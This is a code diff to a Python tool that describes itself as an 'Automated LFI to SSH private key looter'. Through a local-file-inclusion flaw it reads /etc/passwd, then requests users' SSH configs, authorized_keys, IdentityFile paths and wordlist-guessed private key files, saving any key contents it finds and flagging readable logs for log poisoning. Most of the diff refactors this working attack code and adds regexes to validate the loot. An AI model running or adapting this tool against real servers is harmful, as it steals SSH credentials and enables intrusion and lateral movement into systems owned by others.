@@ -32,16 +32,7 @@ class RawPreparedRequest(PreparedRequest):
 class RawSession(requests.Session):
     def prepare_request(self, request):
         prep = RawPreparedRequest()
-        prep.prepare(
-            method=request.method,
-            url=request.url,
-            headers=request.headers,
-            files=request.files,
-            data=request.data,
-            params=request.params,
-            auth=request.auth,
-            json=request.json
-        )
+        prep.prepare(method=request.method, url=request.url, headers=request.headers, files=request.files, data=request.data, params=request.params, auth=request.auth, json=request.json)
         return prep
 
 def get_session(proxy, headers_list):
@@ -58,8 +49,7 @@ def get_session(proxy, headers_list):
 
 def is_valid_shell(shell):
     shell_lower = shell.lower()
-    non_interactive = ["/bin/false", "/bin/sync", "/usr/sbin/nologin", "/sbin/nologin"]
-    return False if shell_lower in non_interactive or "nologin" in shell_lower else True
+    return not (shell_lower in {"/bin/false", "/bin/sync"} or "nologin" in shell_lower)
 
 def check_passwd_file(url, proxy, verbose):
     session = get_session(proxy, None)
@@ -139,10 +129,21 @@ def check_ssh_metadata(base_url, users, proxy, verbose=False):
                 payload = prefix + path.lstrip("/")
                 try:
                     response = session.get(payload, timeout=10)
-                    if response.status_code == 200 and response.text.strip():
-                        print(f"{ORANGE}[!]{RESET} Found {mfile}{ext} for {user}: {payload}")
+                    if response.status_code == 200:
+                        content = response.text.strip()
                         if mfile == "authorized_keys":
-                            found_ssh_users.add(user)
+                            if content and AUTHORIZED_KEYS_REGEX.search(content):
+                                print(f"{ORANGE}[!]{RESET} Found valid {mfile}{ext} for {user}: {payload}")
+                                found_ssh_users.add(user)
+                            else:
+                                if verbose:
+                                    print(f"{ORANGE}[DEBUG]{RESET} {mfile}{ext} at {payload} does not match authorized_keys pattern")
+                        elif mfile == "known_hosts":
+                            if content and KNOWN_HOSTS_REGEX.search(content):
+                                print(f"{ORANGE}[!]{RESET} Found valid {mfile}{ext} for {user}: {payload}")
+                            else:
+                                if verbose:
+                                    print(f"{ORANGE}[DEBUG]{RESET} {mfile}{ext} at {payload} does not match known_hosts pattern")
                 except requests.RequestException as e:
                     if verbose:
                         print(f"{RED}[-]{RESET} Error checking {mfile}{ext} for {user} at {payload}: {e}")
@@ -157,92 +158,95 @@ def check_ssh_config(user, home, prefix, proxy, verbose=False, all_users=None):
         config_url = prefix + config_path.lstrip("/")
         try:
             response = session.get(config_url, timeout=10)
-            if response.status_code == 200 and response.text.strip():
-                print(f"{ORANGE}[!]{RESET} SSH config found for {user}: {config_url} - possible lateral movement")
-                config_text = response.text
-                current_host = None
-                host_details = {}
-                for line in config_text.splitlines():
-                    line = line.strip()
-                    if line.lower().startswith("host "):
-                        if current_host and host_details:
-                            print(f"    Host: {current_host}")
-                            if any(k.lower() in ['hostname', 'user', 'port', 'identityfile'] for k in host_details):
-                                if "HostName" in host_details:
-                                    print(f"       HostName: {host_details['HostName']}")
-                                if "User" in host_details:
-                                    print(f"       User: {host_details['User']}")
-                                if "Port" in host_details:
-                                    print(f"       Port: {host_details['Port']}")
-                                if "IdentityFile" in host_details:
-                                    print(f"       IdentityFile: {host_details['IdentityFile']}")
-                        current_host = line.split(None, 1)[1]
-                        host_details = {}
-                    elif current_host and line and " " in line:
-                        key, value = line.split(None, 1)
-                        host_details[key] = value
-                if current_host and host_details:
-                    print(f"    Host: {current_host}")
-                    if any(k.lower() in ['hostname', 'user', 'port', 'identityfile'] for k in host_details):
-                        if "HostName" in host_details:
-                            print(f"       HostName: {host_details['HostName']}")
-                        if "User" in host_details:
-                            print(f"       User: {host_details['User']}")
-                        if "Port" in host_details:
-                            print(f"       Port: {host_details['Port']}")
-                        if "IdentityFile" in host_details:
-                            print(f"       IdentityFile: {host_details['IdentityFile']}")
-                identity_files = re.findall(r'^\s*IdentityFile\s+(.*)$', config_text, re.MULTILINE)
-                for idf in identity_files:
-                    idf = idf.strip()
-                    if not idf:
-                        continue
-                    if idf.startswith("~"):
-                        new_path = idf[1:].lstrip("/")
-                        candidate = f"{home}/{new_path}"
-                        candidate_url = prefix + candidate.lstrip("/")
-                        try:
-                            idf_response = session.get(candidate_url, timeout=10)
-                            if idf_response.status_code == 200 and "PRIVATE KEY-----" in idf_response.text:
-                                print(f"{RED}[!]{RESET} Private key found for {user} at: {candidate_url}")
-                                found_identity_keys.append((user, candidate_url, idf_response.text))
-                        except requests.RequestException as e:
-                            if verbose:
-                                print(f"{RED}[-]{RESET} Error fetching IdentityFile for {user} at {candidate_url}: {e}")
-                        if all_users:
-                            for other_user, other_home, _ in all_users:
-                                if other_user == user:
-                                    continue
-                                candidate_other = f"{other_home}/{new_path}"
-                                candidate_url_other = prefix + candidate_other.lstrip("/")
-                                try:
-                                    other_response = session.get(candidate_url_other, timeout=10)
-                                    if other_response.status_code == 200 and "PRIVATE KEY-----" in other_response.text:
-                                        print(f"{RED}[!]{RESET} Private key found for {other_user} at: {candidate_url_other}")
-                                except requests.RequestException as e:
-                                    if verbose:
-                                        print(f"{RED}[-]{RESET} Error fetching IdentityFile for {other_user} at {candidate_url_other}: {e}")
-                    elif not idf.startswith("/"):
-                        candidate = f"{home}/.ssh/{idf}"
-                        candidate_url = prefix + candidate.lstrip("/")
-                        try:
-                            idf_response = session.get(candidate_url, timeout=10)
-                            if idf_response.status_code == 200 and "PRIVATE KEY-----" in idf_response.text:
-                                found_identity_keys.append((user, candidate_url, idf_response.text))
-                           
-                        except requests.RequestException as e:
-                            if verbose:
-                                print(f"{RED}[-]{RESET} Error fetching IdentityFile for {user} at {candidate_url}: {e}")
-                    else:
-                        candidate = idf
-                        candidate_url = prefix + candidate.lstrip("/")
-                        try:
-                            idf_response = session.get(candidate_url, timeout=10)
-                            if idf_response.status_code == 200 and "PRIVATE KEY-----" in idf_response.text:
-                                found_identity_keys.append((user, candidate_url, idf_response.text))
-                        except requests.RequestException as e:
-                            if verbose:
-                                print(f"{RED}[-]{RESET} Error fetching IdentityFile for {user} at {candidate_url}: {e}")
+            if response.status_code == 200:
+                config_text = response.text.strip()
+                if config_text and SSH_CONFIG_REGEX.search(config_text):
+                    print(f"{ORANGE}[!]{RESET} SSH config found for {user}: {config_url} - possible lateral movement")
+                    current_host = None
+                    host_details = {}
+                    for line in config_text.splitlines():
+                        line = line.strip()
+                        if line.lower().startswith("host "):
+                            if current_host and host_details:
+                                print(f"    Host: {current_host}")
+                                if any(k.lower() in ['hostname', 'user', 'port', 'identityfile'] for k in host_details):
+                                    if "HostName" in host_details:
+                                        print(f"       HostName: {host_details['HostName']}")
+                                    if "User" in host_details:
+                                        print(f"       User: {host_details['User']}")
+                                    if "Port" in host_details:
+                                        print(f"       Port: {host_details['Port']}")
+                                    if "IdentityFile" in host_details:
+                                        print(f"       IdentityFile: {host_details['IdentityFile']}")
+                            current_host = line.split(None, 1)[1]
+                            host_details = {}
+                        elif current_host and line and " " in line:
+                            key, value = line.split(None, 1)
+                            host_details[key] = value
+                    if current_host and host_details:
+                        print(f"    Host: {current_host}")
+                        if any(k.lower() in ['hostname', 'user', 'port', 'identityfile'] for k in host_details):
+                            if "HostName" in host_details:
+                                print(f"       HostName: {host_details['HostName']}")
+                            if "User" in host_details:
+                                print(f"       User: {host_details['User']}")
+                            if "Port" in host_details:
+                                print(f"       Port: {host_details['Port']}")
+                            if "IdentityFile" in host_details:
+                                print(f"       IdentityFile: {host_details['IdentityFile']}")
+                    identity_files = re.findall(r'^\s*IdentityFile\s+(.*)$', config_text, re.MULTILINE)
+                    for idf in identity_files:
+                        idf = idf.strip()
+                        if not idf:
+                            continue
+                        if idf.startswith("~"):
+                            new_path = idf[1:].lstrip("/")
+                            candidate = f"{home}/{new_path}"
+                            candidate_url = prefix + candidate.lstrip("/")
+                            try:
+                                idf_response = session.get(candidate_url, timeout=10)
+                                if idf_response.status_code == 200 and "PRIVATE KEY-----" in idf_response.text:
+                                    print(f"{RED}[!]{RESET} Private key found for {user} at: {candidate_url}")
+                                    found_identity_keys.append((user, candidate_url, idf_response.text))
+                            except requests.RequestException as e:
+                                if verbose:
+                                    print(f"{RED}[-]{RESET} Error fetching IdentityFile for {user} at {candidate_url}: {e}")
+                            if all_users:
+                                for other_user, other_home, _ in all_users:
+                                    if other_user == user:
+                                        continue
+                                    candidate_other = f"{other_home}/{new_path}"
+                                    candidate_url_other = prefix + candidate_other.lstrip("/")
+                                    try:
+                                        other_response = session.get(candidate_url_other, timeout=10)
+                                        if other_response.status_code == 200 and "PRIVATE KEY-----" in other_response.text:
+                                            print(f"{RED}[!]{RESET} Private key found for {other_user} at: {candidate_url_other}")
+                                    except requests.RequestException as e:
+                                        if verbose:
+                                            print(f"{RED}[-]{RESET} Error fetching IdentityFile for {other_user} at {candidate_url_other}: {e}")
+                        elif not idf.startswith("/"):
+                            candidate = f"{home}/.ssh/{idf}"
+                            candidate_url = prefix + candidate.lstrip("/")
+                            try:
+                                idf_response = session.get(candidate_url, timeout=10)
+                                if idf_response.status_code == 200 and "PRIVATE KEY-----" in idf_response.text:
+                                    found_identity_keys.append((user, candidate_url, idf_response.text))
+                            except requests.RequestException as e:
+                                if verbose:
+                                    print(f"{RED}[-]{RESET} Error fetching IdentityFile for {user} at {candidate_url}: {e}")
+                        else:
+                            candidate = idf
+                            candidate_url = prefix + candidate.lstrip("/")
+                            try:
+                                idf_response = session.get(candidate_url, timeout=10)
+                                if idf_response.status_code == 200 and "PRIVATE KEY-----" in idf_response.text:
+                                    found_identity_keys.append((user, candidate_url, idf_response.text))
+                            except requests.RequestException as e:
+                                if verbose:
+                                    print(f"{RED}[-]{RESET} Error fetching IdentityFile for {user} at {candidate_url}: {e}")
+                else:
+                    if verbose:
+                        print(f"{ORANGE}[DEBUG]{RESET} SSH config at {config_url} does not appear valid (missing 'Host' directive)")
         except requests.RequestException as e:
             if verbose:
                 print(f"{RED}[-]{RESET} Error fetching SSH config for {user} at {config_url}: {e}")
@@ -319,10 +323,7 @@ def fuzz_user(user, home, wordlist, prefix, session, all_flag, continue_on_succe
                 time.sleep(1)
     else:
         with ThreadPoolExecutor(max_workers=10) as executor:
-            future_to_candidate = {
-                executor.submit(fuzz_task, user, prefix + candidate.lstrip("/"), session, verbose, ignore_403): candidate
-                for candidate in candidates
-            }
+            future_to_candidate = {executor.submit(fuzz_task, user, prefix + candidate.lstrip("/"), session, verbose, ignore_403): candidate for candidate in candidates}
             for future in as_completed(future_to_candidate):
                 result = future.result()
                 if result == "403":
@@ -344,15 +345,9 @@ def fuzz_ssh_keys_for_users(base_url, users, wordlist, proxy, all_flag, continue
     session = get_session(proxy, None)
     prefix = base_url.rsplit("etc/passwd", 1)[0]
     usernames = [user for user, home, uid in users]
-    ordered_users = sorted(
-        users,
-        key=lambda x: (0 if x[0] in found_ssh_users else 1, 0 if x[2] == 0 else (x[2] if x[2] < 1000 else 10000))
-    )
+    ordered_users = sorted(users, key=lambda x: (0 if x[0] in found_ssh_users else 1, 0 if x[2] == 0 else (x[2] if x[2] < 1000 else 10000)))
     for user, home, _ in ordered_users:
-        keys = fuzz_user(
-            user, home, wordlist, prefix, session, all_flag, continue_on_success,
-            verbose, ignore_403, usernames, no_rate_limit
-        )
+        keys = fuzz_user(user, home, wordlist, prefix, session, all_flag, continue_on_success, verbose, ignore_403, usernames, no_rate_limit)
         found_keys.extend(keys)
     return found_keys
 
@@ -375,15 +370,13 @@ def fuzz_additional_paths(base_url, proxy, verbose, wordlist):
             except Exception as e:
                 if verbose:
                     print(f"{RED}[-]{RESET} Error checking {candidate_url}: {e}")
-    if not found:
-        print(f"{GREEN}[+]{RESET} No accessible SSH keys found for additional directories")
     logs_found = []
     log_files = ["/var/log/auth.log", "/var/log/apache2/access.log", "/var/log/syslog", "/var/log/vsftpd.log", "/var/log/apache/error.log", "/var/log/main.log", "/var/log/nginx/error.log"]
     for path in log_files:
         candidate_url = prefix + path.lstrip("/")
         try:
             response = session.get(candidate_url, timeout=10)
-            if response.status_code == 200 and len(response.text) > 50:
+            if response.status_code == 200 and len(response.text) > 50 and LOG_REGEX.search(response.text):
                 print(f"{RED}[!]{RESET} Log file found: {candidate_url} - this file may be used for log poisoning if writable")
                 logs_found.append(candidate_url)
             else:
@@ -397,10 +390,7 @@ def fuzz_additional_paths(base_url, proxy, verbose, wordlist):
     return found
 
 def main():
-    parser = argparse.ArgumentParser(
-        description="Automated LFI to SSH private key looter",
-        epilog="Common SSH private key names: https://github.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists"
-    )
+    parser = argparse.ArgumentParser(description="Automated LFI to SSH private key looter", epilog="Common SSH private key names: https://github.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists")
     parser.add_argument("-u", "--url", required=True, help="LFI URL pointing to /etc/passwd")
     parser.add_argument("-l", "--list", required=True, help="Wordlist containing SSH private key names")
     parser.add_argument("-o", "--output", help="File to save found private key URLs and contents", default=None)
@@ -411,12 +401,10 @@ def main():
     parser.add_argument("--no-rate-limit", action="store_true", help="Disable rate limiting on proxy (for debug/testing purposes)")
     parser.add_argument("-c", "--continue-on-success", action="store_true", help="Continue scanning all users for private keys even after a match is found")
     args = parser.parse_args()
-
     print(BANNER)
     print(f"{ORANGE}[*]{RESET} The script provided is for educational purposes only, I am not responsible for your actions.")
     if args.proxy and not args.no_rate_limit:
         print(f"{ORANGE}[*]{RESET} Proxy mode enabled; requests will be processed sequentially with a 1s delay.")
-
     passwd_content = check_passwd_file(args.url, args.proxy, args.verbose)
     if not passwd_content:
         sys.exit(f"{RED}[-]{RESET} Exiting due to invalid /etc/passwd response")
@@ -431,10 +419,7 @@ def main():
         identity_keys.extend(check_ssh_config(user, home, prefix, args.proxy, args.verbose, valid_users))
     with open(args.list, "r") as f:
         key_wordlist = [line.strip() for line in f if line.strip()]
-    found_keys = fuzz_ssh_keys_for_users(
-        args.url, valid_users, key_wordlist, args.proxy, args.all,
-        args.continue_on_success, args.verbose, found_ssh_users, args.ignore_403, args.no_rate_limit
-    )
+    found_keys = fuzz_ssh_keys_for_users(args.url, valid_users, key_wordlist, args.proxy, args.all, args.continue_on_success, args.verbose, found_ssh_users, args.ignore_403, args.no_rate_limit)
     if args.all:
         extra_found = fuzz_additional_paths(args.url, args.proxy, args.verbose, key_wordlist)
         found_keys.extend(extra_found)
@@ -448,6 +433,43 @@ def main():
             f.write("\n\n".join(entries))
         print(f"{GREEN}[+]{RESET} Results saved to {args.output}")
     print(f"{GREEN}[+]{RESET} Done (～￣▽￣)～")
+
+AUTHORIZED_KEYS_REGEX = re.compile(r"""^
+    (?:\s*(?:(?:"[^"]*"|[^",\s]+)(?:,|$))*)? 
+    (ssh-(?:rsa|dss|ed25519)|ecdsa-sha2-nistp256|ssh-ed25519-cert-v01@openssh\.com|sk-ssh-ed25519@openssh\.com)
+    \s+
+    ([A-Za-z0-9+/]+={0,2})
+    (?:\s+.*)?
+    $
+    """, re.VERBOSE | re.MULTILINE)
+
+KNOWN_HOSTS_REGEX = re.compile(r"""^
+    \s*
+    (?:@(?:cert-authority|revoked)\s+)?  
+    (?:
+      (?:\|1\|[A-Za-z0-9+/]+={0,2}\|[A-Za-z0-9+/]+={0,2})
+      |
+      (?:[^\s,]+(?:,[^\s,]+)*)
+    )
+    \s+
+    (ssh-(?:rsa|dss|ed25519)|ecdsa-sha2-nistp256|ssh-ed25519-cert-v01@openssh\.com|sk-ssh-ed25519@openssh\.com)
+    \s+
+    ([A-Za-z0-9+/]+={0,2})
+    (?:\s+.*)?
+    $
+    """, re.VERBOSE | re.MULTILINE)
+
+SSH_CONFIG_REGEX = re.compile(r"^(?!\s*#)\s*Host\s+\S+", re.IGNORECASE | re.MULTILINE)
+
+LOG_REGEX = re.compile(r'''(?xi)
+^(
+  (?:[A-Z][a-z]{2}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2})
+  |
+  (?:\d{4}-\d{2}-\d{2}\s+\d{2}:\d{2}:\d{2})
+  |
+  (?:\d{1,3}(?:\.\d{1,3}){3}\s+-\s+-\s+\[)
+)
+''', re.MULTILINE)
 
 if __name__ == "__main__":
     main()
